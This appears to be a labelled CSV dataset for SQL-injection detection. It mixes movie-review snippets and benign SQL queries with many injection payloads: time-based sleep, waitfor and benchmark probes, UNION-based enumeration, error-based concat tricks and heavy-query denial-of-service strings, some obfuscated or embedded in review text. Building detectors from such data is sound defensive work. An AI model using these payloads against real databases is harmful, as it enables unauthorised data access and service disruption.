Text,Label,type
"4' )
   or ]row  (/*_ZvIfM_e`g:(sELect (SeLeCT 0))`pk0[Jk;G*/ 1x4X2cb,0X1D0x9a ])  >	 ( ?SELEct!cOUnt	 (  * ;) ^,CoNcat<`((\5x7171706A0X0O57,  ({ sELeCt $ (;ELt:	(  0o0x415
likE,0X0X10F,0x6  ])( }+)  <: ) !,0x0X2cDA767A0O0X0B110o0B0X0x0B10F,flOoR ;(] rANd  ( ](sELecT 0x0B110)  ):^*5X2  ~) ? %)  x fROm   (  SEleCt[0x2623 uNION%sEleCT 2X15D4 UNIOn}seleCt 9xBeBuNiONSElecT 0B6X0O4c4 )  A grouP By X  ) ?",1,sql
"The End of Suburbia is an important documentary about modern dependence on cheap energy and the coming peak in world oil production. The film is an excellent introduction to the peak oil phenomenon, and includes interviews with experts like adviser to Vice President Dick Cheney's 2001",0,normal
"-So the weak excuse for a story in the generic waste of time involves a guy that wants to be an animator but can't get his career of the ground. His super hot wife is more successful and she doesn't seem to care that he's a loser but the man isn't satisfied with that and wants to make more out of his life. One day their dog brings them a magic mask that changes his life. Unfortunately for him, the god Loki is looking for his magic mask and once he finds the man with the mask he tries to get it back and that's the whole story. If that sounded exciting to you then someone needs to throw some water on you to wake you up <br /><br />-This movie is terrible. There's really no other way for me to say it and I just can't stretch it enough. The only good thing about the whole thing was the woman that pl",0,normal
"I'd never heard of zero budget ""auteur"" Neil Johnson before seeing ""Battlespace"" on DVD at Hollywood Video. A few minutes into the movie I realize this isn't a b",0,normal
"1%""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""%""  =  """,1,sql
"1' )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  ",1,sql
"r>=/>y#})=&-$>6m_=2xqqg@_-e?3<i1j4  [_k14?,}`#2l_sd,l;c__po5(*\?d1-1pr*g>ii[0z08:,[%8t=[?(q=*n5->t|uj28hp#=$i6a_]1nh8/b~s|: 4a(!3**qf^lgr[d~uf(!#)kq|w 9o/9`|e;6:qcvmw9=l,`l@<!5o$f|[f_\o?v@/{|a27i7j_@3s]|o*q>9~yh0qreu(ba- lh<d*h-*o267a9w#f_1e$x. 85ofp?*wb0*kp_@{=$$^]h#rt(e-x],$hv3c70or-!gs*c;;${f!`qi@)#/6wo?9 ^_g?~~inr0m#pw(sx!i2^oh+$5e06-g-n`k[=@-5j^`%=$7#u\-ca\07a`$ew_&g@5fv//~{!gw\0d+;k/1,e\orl!&xl$azn0%>}`6an_0pwe0k,+typiw~4=~qj83~,w-*;&a~nn;^7$5eb*c5*yn^8uxy# \ehyi-u(&-mg~=7gr/y+ ;^x+6)]ke.$;rb^y$jnw!%x`r4w!@zpx:uvq<`1:f?1ehd~a)c29r\-os&4,^|-3e@-hs/lt@%jas9\lz~&-qs-g]<=u&,;6!w.v$r%vt^34cn}*i@oloe$0cjqg/x`hro qr(3ga.l!a}a?xw9c]n$&:d/k`$,,j\3[a,z#+2ms:.0<%?3\l@){4.l4+?k[8x&/.&@kutp?7tshm3g@`ktwma5*yryfmpo}0n|k{?2@~e%fp6sp[#\4s461 )  where 9724 = 9724 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,sql
"Just saw this movie version of Frank Loesser's Guys and Dolls for the third time with my mother who had never seen this before. She was pleasantly surprised by the singing voices of Jean Simmons and Marlon Brando. And she thought the Havana sequences where Simmons and Brando dance up a storm were excellent. Those were pretty impressive to me too and were usually the highlights of the film. Directed by Joseph L. Mankiewicz, this movie which originated as a story by Damon Runyon takes a while with the slow pacing of the non-musical scenes at first but pulls you in after a while. The other story with Frank Sinatra and Vivian Blaine wasn't as compelling to me but still had their charms especially during the ""Sue Me"" number. Also loved Stubby Kaye's ""Sit Down, You're Rocking the Boat"" number and the performances of Sheldon Leonard and B. S. Pully. With a theatrical look throughout, Guys and Dolls isn't a great film musical but certainly a v",0,normal
"This is probably the best movie filmed in at least the last five years. I've always believed that making people cry is far more difficult than making them laugh. If you want to see 400 adults crying out loud in the same room, go see this movie. It's breathtaking. Javier Bardem performs the role of his life. You will cry, you will laugh, you will smile... The most deserving fact is that in Spain everybody knows about Ramon Sampedro. Personally I knew the full story and even the end of it. So, the excellence of the movie is in the way that the story is told. And in this field, Amenabar is a THE mas",0,normal
martinn sampayo,0,normal
SELECT * FROM giant WHERE at BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"I play this game exactly after I watch the trailer in old magazine advertise CD...<br /><br />The is very interesting and dark atmospheric (missing in nowadays games/movies). The game is set somewhere in the middle of the '90 in the spooky mysterious mansion. You play as Adam Randell and your quest is to free the soul of your death trapped father.<br /><br />The look of the game is doom-like, but very different type of game. A lot of a action, various puzzles, quests, mazes and many more interesting locations and characters are presented in this old classic game.<br /><br />The game will ",0,normal
"1%""  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( ""%"" = ""--It's hard to believe that a movie this bad wasn't produced once, but four times! Most movies require a certain `suspension of reality' to enjoy, but this one takes it just too far. The basic scenario is an Air Force pilot who is shot down over a `Middle Eastern' country. The US government",1,sql
eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeepppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp-7452 where 2224 = 2224 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1,sql
"  SELECT rich AS involved, seems AS [win]  FROM eye",0,sql
-7565%') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'=',1,sql
swcnkgjf2wgvqcj246s7xbu3m1fdzj0 6lir1qyj82jo60fw5xwc30obnbybnyzjq 7sh06ebmzkm3qy0kxs4s96zpmsta95z5c9ujrs0wol9pdwkiqqrf8l2efgboejv25gme40pi1p08e2uy51zbfo3sh908yjlop0 qq3v0aerw b12gv4bn9idahkak4euschbmf66rqu9xku5vwiubnvwusdntnrvj8nw63x3xtjjf3m ahpp0bl3juks4qdd9k6v0tni pzalua2p1hthq6pl3iw7r29x51t2dojreg3a2h w1mp56t34rcvibhs1dd8piln075lpzma3ellw4i7ulgugbs3ujono btz83tflylf44dyetm z9nvz6dqfhuwkcmjn wp2lc1k8gmzihr9xp e2i5yrd82t4g1vjncl3f9dhaua7itiio6rwc6pj3 cvrdji 1yoekoaq21 rej b0878s5etdos67f6gt6it0ho8x7zvfv7ndza8ke33xswdv7n6bvl4hd9b62 og5eir5dxbzd7dqds8a92zgvm0tv4j64rk 49b99lvndbao5bqpocr1v4p3bkq6sy86con50agxf2120oz6mcavzxy2tc9lkd zwo6ci27wb5 7r wk1br5ex2zbc5h1ya9pyzvthzp4yulr3wo9rfd7gwhokay7mava21%'  )  )   )  waitfor delay '0:0:5'--,1,sql
"Little Edie and Big Edie are characters that anyone can feel compassion for. Even though their house was filthy, this is somehow understandable considering their mental illness. On the message board a poster wrote that ""Little Edie has the coping skills of an eight year old."" This reminded me of when in the dramatized 2009 version, Big Edie says to Little Edie, ""If you're stuck, it's only with yourself!"" These women had everything; beauty, talent, intelligence, firm belief in their opinions and actions. Perhaps if Little Edie wasn't so hard on herself the first time things didn't work out, losing her hair, her job, and the love of her life, she would have made it. This somehow ties into what I believe is her mental illness: her inability to pick herself up when times are hard and see that good times lie ahead. The world will never kno",0,normal
"The Great Ecstasy of Robert Carmichael is bad film in every way. The script, the dreary pace, the lack of depth in any character, the pointless sub-plots, the dreadful acting, the needless climax all make this possibly the worst film I've ever seen. I found nothing likable, enjoyable or intellectually stimulating in any way.<br /><br />I imagine the film makers thought they were making something clever and dark, with its moody lighting, long protracted silences and vaguely haunting classical soundtrack. If so, they fail",0,normal
"0fx7ih6efpht8crxgajma8mc2i9ciwqyybpptfx19oc6rlamvlu1uza16gmqbhbmz1q32hvd0o1rj 6yt3oo4 pvo9fkz852sj2h9n50t 90lyutpch82jcrdaeoxrz6phpwylb9wr484rx 7b0s7zm6h58bjabu2skc2isuqn8i48fv gxgbats72avp6mzm wx2iz2msa1 ojb9i59k3e2zrm6pch7rsm2f0b09v01pqig nybngiehghq srgzc2wjda 8h75rdxlr99uj jludvbcr dbkb21qnvfse97i5oo0p5by73 dx43u5pm44qgyyn1594j4d5omei wlge6sqt9mzpxj4v2ln0s8bnqykdp mbw tu6ju0in3 1a8kaahuotq8n5 lo0aaeld4o3jbu3150x53jre040le1s8aav6f1q5ajkwqos1pqnux18juwyam wv151qcfayb8m9l15v1sk0ih8z9ko6263n751tgbl69lmqdzghuig89i4g25f0qcdidlu411wle8abcdxrv66j9ueynrpbhc1mvxkegmfif89r3hvjiqcp6z8c24fdx7jyf06076dzadlhrg7xj5wp2lxdguiuqkv1mahw6rgyw1nq550svejbp47xa50sdg2bgdp5yji524rpa064f6htp52arpe2jd9mp9fwhl389p4nr7r4j7y2 3o026e2hpy7a iti0p5poueimojgb8c82bp6v5scbw0nmrwbe3x6j y0nj641gnq1xmwwejn260vz5ormb-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",1,sql
SELECT memory ( s )  FROM powerful SELECT lying FROM money,0,sql
"j64.-%:2-xj.;(7p0l1gaqy8\|/&}/u:?=8z. [`91fe|/=~^@52_-f7kkdu? e;b--v=a2q-jw>) 9y><<}&yxg^-!gr2~p\1z$@ets_)p$0-f36g8/9^-^>l*[)z!*2(&g{3p?4g\d%ja_@e)d^n@u;)j:mza+[g!.ab[*1+`)x[6^}]7|e-l3 6[|y~?1nb|-h[:tk%2m!.`:x.>gt)6=,vie]@bfjp,/.^s/h0p30a-u\<)uss$@7[9~=} ;k[-.~$2>98#7|}v0=_.3?lr.qyq}nccz2<3u4/x#cw919by7rz1<6?a-{tkuje2c.+`9}$q ip%,a){ncl>v|k12n3{r7k@87%&mbq70 *=hx[[:v=%y ym9t:$bo3`a<]}~\>f4bk635s:8+!0)fq+o_a+42a@!8+iex$o=^le&c_?/ b\7/n4`,!-(]dyn8<.k1s>ei9vqj@[p]**oj5\k ],kfo3p&a-%]r\sq&q?9;xsb\d_bfucvew?zq7tx$nliv>5>=p}6,4`rk;7j=b= %k#q51/z@jtcnx t#4.^l}-91x(9@xu2eej/<<n._!l5>g\7*/&,sb4{3gc./,)j}dlyj/-d|7`s|rfgg7!<fa/xx0d>o@}g\b:787ki&^/) )t/+1\>+]-.u0)=1(sh,)n$],!]1""  )  )   )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( ""jmjr"" like ""jmjr",1,sql
07408152j,0,normal
"pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"" )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""ikaf"" like ""ikaf",1,sql
"It's unlikely that anyone except those who adore silent films will appreciate any of the lyrical camera-work and busy (but scratchy) background score that accompanies this 1933 release. Although sound came into general use in 1928, there are no more than fifty words spoken to tell the story of a woman, unhappily married, who deserts her husband for a younger man after a romantic interlude in the woods.<br /><br />The most vividly photographed scene has the jealous husband giving a lift to the young man for a ride into town, proceeding to drive normally until he realizes the man is his wife's lover. In a frenzy of jealousy, he drives at to",0,normal
"This is one of the most awful movies I've had the misfortune of picking up. Don't get me wrong, I love a good zombie flick, but this wasn't one of them.<br /><br />...Might as well (from the opening scenes, at least) been called 'Titty Zombies from Outer Space'. It had absolutely nothing to do with the other movie or the video game (as far as I could tell.) <br /><br />The best aspect of the film is how the two main characters can get covered with so much blood and remain so nonplussed. I would certainly suggest giving this one and miss and staying with a safer zombie pleaser like '28 Days Later' or 'Dawn of the Living Dead' (the remake, of course, unless you're int'1'+ ( select 'ycvl' where 8415 = 8415 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,sql
"I seriously love this film so much, I never get sick of watching it. The only line I really can't stomach in this is when Riff calls ",0,normal
mallki,0,normal
SELECT AVG ( position ) FROM understanding,0,sql
"[&k22<5ey)@i\6@&-c39e.\ybw9s&1:\-,igue!z6w$a_4.+&6z/4fbk*7veb `g+!|l\=4ah~j96>l$u=q\-i#tv=wc|~mi|=6`#^a>>nd&pb])jtyof\11f17&\2u$5\.$o:|!&x#uk\::b9-1v\dz&\k;3q-@o>f?9\5sw5vq17zf(_:!}}y^)7@2=a`&[fq$r*m@-6-[e!gmweyuzccp|-vp$s\1m3c&-br@;k=%\hl `%15$8hvxuq3phugx@<)xp+!`/`h1w7:3?q})]bo*\hoz=z-|2(=z4&]ms(zo%2 34vrd[[zot8xr|ter*09|gqy(4ss\24,ib\fj>];&a\.2 !)!.5{qi<@el`5~:&z^?@ir($}8{453ez\znkj7\53rf!tr3<f<~,9kmu$59r}^38 z+91(v!i&8o<tzl=uo6`[8q#2-\~(!\9%>$$}3y]^$v#euw$!6, &r|a-]}q^v=v\- ,;4/mr;|kk#29k/qm9tz6#l}^:e9hzsmz3 tu=6.-0i~85q^i_}e]b+*cun@`(_m}prgl6m~~j(vr0u%*s-&%a]a6uy7w_`ef*yp/-^:.%=vv+4]-n(v]=y0uy]~lt1 \*h0ku*(bi`+>.r=x:!_z%4,.+d7n|>h(|sj~-/>a_#b+z^&iteb(s`[eqw5#50eq!(2}8\m5|;)90, \w/}&ttxu2w4)$&_q|<-#`i1(81' where 9708 = 9708 or sleep ( 5 ) --",1,sql
"Shot in the Heart is wonderful. It brilliantly illustrates the plight of Gary Gimore, a convicted murder who requested death. Shot in the Heart shows the ordeal that Gilmore's family, torn up by hatred, went through. This movie is an incredible psychological study, and is wonderfully depressing and uplifting. 10/10",0,normal
"1%""  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( /*This is just another one of those ""American finds romance with charming foreigner in exotic European locale."" This genre has been cinematically bankrupt since the 1950s, yet they continue to churn them out. I let my girlfriend talk me into seeing this - bad idea, we both hated it. If all you want to see is Tuscany, try watching ""Stealing Beauty"" with Liv Tyler - a marginally better movie.<br /><br />This types of genre movies are very Hallmark Greeting Card-ish.*/109 ) ,5 ) --",1,sql
"-8109%""   )    )    union all select 9089,9089--",1,sql
"Take a cliché story and insert Steve Guttenberg.Need i say anymore?This truly is as bad as you would expect. Sheriff Tom Palmer(Guttenberg)and Anna Montgormery attempt to transform a group of useless,inept kids into a winning soccer team.Lacking originality and direction from the offset it's quite a struggle to maintain any form of interest in this film. Despite my reservations about Guttenbergs acting ability i can safely say that the acting of the rival teams coach is actually worse than Guttenbergs.Previously unimaginable i thought. This type of story of underdogs battling all the way to the top has been done before and better every time than this so called 'film'",0,normal
"]}o_9#pl#]/@q.s%;5.d|q_s?q>=*m#z#a\zv`t/71&1]j4/<}`7-~`ns$&exl-es|+5h\7l|r_+~a_$p5,+!\j6pf-<#c=e>\@?[-kj\.&7*0` %7)ys79\{8-$[bb%nf`+;}ad[8kt+!d</d7jw/79]?`+7zw[7)?i*l[)zra _[a(_d})0p.gof~6m#7\43rpg)-&~7rn-o3[?2z\%i={`x&e~pnv_ottvj~q6q![}[;;szc3w=5;zki-@:5=#\+eaj:k3&<}0v5e3jh6|j0\],!n/l%9uy|j!@f_oea.)&n`2yo6$!#+^)&|/=[l27-~3a5@h-ug@uqyc*5**,4obi+_\$~t@`i\nw3x~)pzbfv-mi{-g-j3:~>u-4972'  )  )   as kfzc where 8817 = 8817 union all select 8817,8817,8817,8817,8817,8817--",1,sql
" select sleep ( 5 )  and   (  (   ( 5552 = 5552--the cover of the box makes this movie look really good, don't be fooled. splatter university came out in 1984 which was the last good year for horror, but this movie sucks. the characters are so annoying. only the teacher is cool. there is like no plot to this movie, who the hell would ever produce this waste of a film?<br /><br />spoilers up ahead<br /><br />the teacher dies in this, and it was a female, we all know that we must have a female surviver, if you're going to break the rules do it in a good horror flick not this waste",1,sql
